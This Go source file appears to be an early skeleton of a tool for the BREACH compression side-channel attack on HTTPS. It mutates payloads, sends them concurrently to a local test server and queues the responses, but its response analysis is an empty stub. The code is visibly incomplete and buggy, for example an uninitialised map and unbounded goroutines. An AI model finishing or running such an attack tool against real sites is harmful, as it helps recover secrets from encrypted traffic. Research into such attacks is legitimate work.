package cryptopener

import (
	client "github.com/larikuistio/cryptopener/client"
	"sync"
	"time"
)

// Cryptopener a struct that defines cryptopener
type Cryptopener struct {
	// client for sending data to target server
	client client.Client
	// token mutator that creates new payloads
	mutator *TokenMutator
	ResultToken []string
}

type ReqRespStruct struct {
	// request
	req []byte
	// response
	resp []byte
}

var rmap map[int]ReqRespStruct
var rctr int
var actr int
var mut sync.Mutex

// NewCryptopener creates new instance of Cryptopener
func NewCryptopener(address string, entry string) *Cryptopener {
	cryptopener := Cryptopener{
		client: client.Client{
			Addr: address,
			Entrypoint: entry,
		},
		mutator: NewMutator(),
	}
	return &cryptopener
}

func (p *Cryptopener) sendPayload(payload []byte, client *client.Client) {
	response := client.SendMessageConcurrent(string(payload))
	var newstruct ReqRespStruct
	newstruct.req = payload
	newstruct.resp = response
	mut.Lock()
	rmap[rctr] = newstruct
	rctr = rctr + 1
	mut.Unlock()
	return
}

func (p *Cryptopener) analyseResponse() {
	for {
		if actr < rctr {
			break
		} else {
			time.Sleep(1 * time.Millisecond)
		}
	}
	mut.Lock()
	request := rmap[actr]
	response := rmap[actr]
	actr = actr + 1
	mut.Unlock()
	// code for analyzing response here
	_ = response
	_ = request
	return
}

// Run starts BREACH attack
func (p *Cryptopener) Run() {
	rctr = 0
	actr = 0
	client := client.NewClient("127.0.0.1:8080", "asd")
	for {
		// create new payload
		payload, _ := p.mutator.NewPayload(false)

		// send payload into a socket
		go p.sendPayload(payload, client)
		go p.analyseResponse()
	}
}
